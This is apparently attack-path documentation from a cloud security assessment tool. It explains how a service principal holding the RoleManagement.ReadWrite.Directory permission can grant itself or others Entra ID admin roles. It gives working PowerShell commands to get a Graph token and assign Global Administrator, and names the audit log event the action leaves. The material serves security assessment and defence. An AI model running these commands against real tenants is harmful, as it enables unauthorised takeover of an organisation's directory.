 It is created against all Entra ID admin roles when a Service Principal has the following MS Graph app role assignment:

* RoleManagement.ReadWrite.Directory

This privilege allows the Service Principal to promote itself or any other principal to any Entra ID admin role, including Global Administrator.

## Abuse Info

To abuse this privilege, you can promote a principal you control to Global Administrator using BARK’s New-AzureADRoleAssignment. This function requires you to supply an MS Graph-scoped JWT associated with the Service Principal that has the privilege to grant Entra ID admin roles. There are several ways to acquire a JWT. For example, you may use BARK’s Get-MSGraphTokenWithClientCredentials to acquire an MS Graph-scoped JWT by supplying a Service Principal Client ID and secret:

```bash
$MGToken = Get-MSGraphTokenWithClientCredentials `
    -ClientID "34c7f844-b6d7-47f3-b1b8-720e0ecba49c" `
    -ClientSecret "asdf..." `
    -TenantName "contoso.onmicrosoft.com"
```
Then use BARK’s New-AzureADRoleAssignment function to grant the Entra ID role to your target principal:

```bash
New-AzureADRoleAssignment `
    -PrincipalID "6b6f9289-fe92-4930-a331-9575e0a4c1d8" `
    -RoleDefinitionId "62e90394-69f5-4237-9190-012177145e10" `
    -Token $MGToken
```
If successful, the output will include the principal ID, the role ID, and a unique ID for the role assignment.

## Opsec Considerations

When you assign an Entra ID admin role to a principal using this privilege, the Azure Audit log will create an event called “Add member to role outside of PIM (permanent)”.
